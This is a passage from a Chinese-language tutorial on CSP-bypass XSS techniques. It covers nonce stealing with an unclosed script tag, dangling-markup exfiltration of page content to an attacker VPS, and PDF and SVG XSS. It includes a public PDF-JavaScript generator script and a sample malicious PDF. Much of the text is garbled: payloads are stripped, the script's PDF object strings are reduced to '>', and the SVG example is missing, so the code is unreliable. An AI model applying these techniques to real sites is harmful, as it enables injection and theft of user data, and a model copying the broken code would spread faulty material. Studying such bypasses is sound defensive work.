这里给出的环境符合我们利用不完整script标签绕过nonce，所以可以操作一下
    ?xss=`标签的属性名，值为空，而原本的`nonce`属性的值成了我们构造的``的属性的值，这里可以理解为我们窃取了`nonce`值，从而绕过CSP。
这个payload在火狐浏览器上可以执行且不报错的，但是经过测试在chrome浏览器中，进行解析时会报错
这里可以用到标签的一个技巧，当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略
    ?xss=123
这里设置的CSP策略指令img-src允许加载外域图片资源，就是意味着该网页允许从任何来源加载图像。
所以说，我们是不是可以利用``标签伪造一下我们的XSS恶意代码，从而注入到该网页呢？
    ?key=`标签将数据外带到我们的VPS上，这里就要涉及一个语法了
当我们的标签未闭合时，html解析器会一直去寻找下一个引号，从而闭合src属性，所以说在下一个引号前的标签都不会被解析，从而绕过CSP
利用此特性，我们可以将CSP策略下方的内容给外带到我们的VPS上，从而实现窃取信息。
##### 12.利用PDF XSS绕过
**适用于没有设置object-src，或者object-src没有设置为'none'，pdf用的是chrome的默认解析器。**
PDF
XSS是存储型XSS的一种攻击方式，其实原理也很简单，就是攻击者将恶意代码写入PDF文件中，将此图片利用文件上传或者创建在自己的VPS上，受害者访问从而进行XSS攻击。
PDF XSS不能获取页面cookie，但是可以弹窗，url跳转等。
这种类型的XSS，我自己是没有见过的，借用一下大师傅的源码。
源码示例
在CSP标准里面，有一个属性是object-src，它限制的是`  `标签的src属性，也就是插件的src属性
我们可以通过插件来执行Javascript代码， **插件的js代码并不受script-src的约束**
之后我们在自己的VPS上创建一个带有恶意脚本的1.pdf文件即可。
这里附上一个用来生成含有JavaScript的PDF文件的国外师傅的开源python脚本
    #!/usr/bin/python
    # V0.1 2008/05/23
    # make-pdf-javascript, use it to create a PDF document with embedded JavaScript that will execute automatically when the document is opened
    # requires module mPDF.py
    # Source code put in public domain by Didier Stevens, no Copyright
    # https://DidierStevens.com
    # Use at your own risk
    #
    # History:
    #  
    #  2008/05/29: continue
    #  2008/11/09: cleanup for release
    import mPDF
    import optparse
    def Main():
        """make-pdf-javascript, use it to create a PDF document with embedded JavaScript that will execute automatically when the document is opened
        """
        parser = optparse.OptionParser(usage='usage: %prog [options] pdf-file', version='%prog 0.1')
        parser.add_option('-j', '--javascript', help='javascript to embed (default embedded JavaScript is app.alert messagebox)')
        parser.add_option('-f', '--javascriptfile', help='javascript file to embed (default embedded JavaScript is app.alert messagebox)')
        (options, args) = parser.parse_args()
        if len(args) != 1:
            parser.print_help()
            print ''
            print '  make-pdf-javascript, use it to create a PDF document with embedded JavaScript that will execute automatically when the document is opened'
            print '  Source code put in the public domain by Didier Stevens, no Copyright'
            print '  Use at your own risk'
            print '  https://DidierStevens.com'
        else:
            oPDF = mPDF.cPDF(args[0])
            oPDF.header()
            oPDF.indirectobject(1, 0, '>')
            oPDF.indirectobject(2, 0, '>')
            oPDF.indirectobject(3, 0, '>')
            oPDF.indirectobject(4, 0, '>\n            >>\n>>')
            oPDF.stream(5, 0, 'BT /F1 12 Tf 100 700 Td 15 TL (JavaScript example) Tj ET')
            oPDF.indirectobject(6, 0, '>')
            if options.javascript == None and options.javascriptfile == None:
                javascript = """app.alert({cMsg: 'Hello from PDF JavaScript', cTitle: 'Testing PDF JavaScript', nIcon: 3});"""
            elif options.javascript != None:
                javascript = options.javascript
            else:
                try:
                    fileJavasScript = open(options.javascriptfile, 'rb')
                except:
                    print "error opening file %s" % options.javascriptfile
                    return
                try:
                    javascript = fileJavasScript.read()
                except:
                    print "error reading file %s" % options.javascriptfile
                    return
                finally:
                    fileJavasScript.close()
            oPDF.indirectobject(7, 0, '>' % javascript)
            oPDF.xrefAndTrailer('1 0 R')
    if __name__ == '__main__':
        Main()
附上用法和命令
    Usage: make-pdf-javascript.py [options] pdf-file
    Options:
      --version             show program's version number and exit
      -h, --help            show this help message and exit
      -j JAVASCRIPT, --javascript=JAVASCRIPT
                            javascript to embed (default embedded JavaScript is
                            app.alert messagebox)
      -f JAVASCRIPTFILE, --javascriptfile=JAVASCRIPTFILE
                            javascript file to embed (default embedded JavaScript
                            is app.alert messagebox)
      make-pdf-javascript, use it to create a PDF document with embedded JavaScript that will execute automatically when the document is opened
      Source code put in the public domain by Didier Stevens, no Copyright
      Use at your own risk
      https://DidierStevens.com
我这里利用这个脚本生成了一个带有恶意脚本的PDF
    %PDF-1.4
    %âãÏÓ
    1 0 obj
    >
    endobj
    2 0 obj
    >
    endobj
    3 0 obj
    >
    endobj
    4 0 obj
    >
    stream
    BT
    /F1 12 Tf
    1 0 0 rg
    72 720 Td
    (PDF XSS Example) Tj
    ET
    >
    endstream
    endobj
    xref
    0 5
    0000000000 65535 f 
    0000000012 00000 n 
    0000000079 00000 n 
    0000000178 00000 n 
    0000000413 00000 n 
    trailer
    >
    startxref
    532
    %%EOF
在我本地测试一下，成功弹窗
##### 13.利用SVG矢量图绕过
**适用于可以上传SVG文件**
SVG是可缩放矢量图形（Scalable Vector
Graphics）的缩写，是一种基于XML语法的2D图形格式，用于描述矢量图形。与像素图形不同，矢量图形是由数学公式和几何图形描述的，因此可以无限放大而不失真。
其实原理跟PDF XSS原理一样的，上面介绍了，这里就不多赘述。
给出一个示例SVG文件：
# 参考
[xss 常用标签及绕过姿势总结 ](https://www.freebuf.com/articles/web/340080.html)
[我的CSP绕过思路及总结](https://xz.aliyun.com/t/5084#toc-3)